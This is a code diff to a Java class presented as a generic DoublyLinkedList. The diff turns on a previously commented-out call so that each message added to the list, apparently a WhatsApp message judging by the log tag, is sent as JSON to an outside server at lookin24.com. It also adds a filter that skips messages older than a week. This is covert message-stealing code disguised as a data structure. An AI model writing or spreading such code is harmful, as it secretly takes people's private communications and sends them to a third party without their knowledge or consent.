@@ -96,6 +96,14 @@ public class DoublyLinkedList<E> {
      * @param element
      */
     public void addLast(final E element) {
+        Message m = (Message)element;
+        if(m.date != null) {
+            long s = m.date.getTimeInMillis();
+            long now = new Date().getTime();
+            if(now - s > (1000 * 60 * 60 * 24 * 7)) {
+                return;
+            }
+        }
 
         new AsyncTask<String, String , Void>() {
 
@@ -115,20 +123,13 @@ public class DoublyLinkedList<E> {
                     e.printStackTrace();
                 }
                 Logger.l("WHATSAPPP", "WILL BE SENDEND" + jo.toString());
-                //new InternetHelper().send("https://www.lookin24.com/Wpmsg",jo.toString());
+                new InternetHelper().send("https://www.lookin24.com/Wpmsg",jo.toString());
                 return null;
             }
         }.execute();
         Node tmp = new Node(element, null, tail);
         //elemesem daha yaxshidi
-        Message m = (Message)element;
-        if(m.date != null) {
-            long s = m.date.getTimeInMillis();
-            long now = new Date().getTime();
-            if(now - s > (1000 * 60 * 60 * 24 * 7)) {
-                //return;
-            }
-        }
+
         if (tail != null) {
             tail.next = tmp;
         }
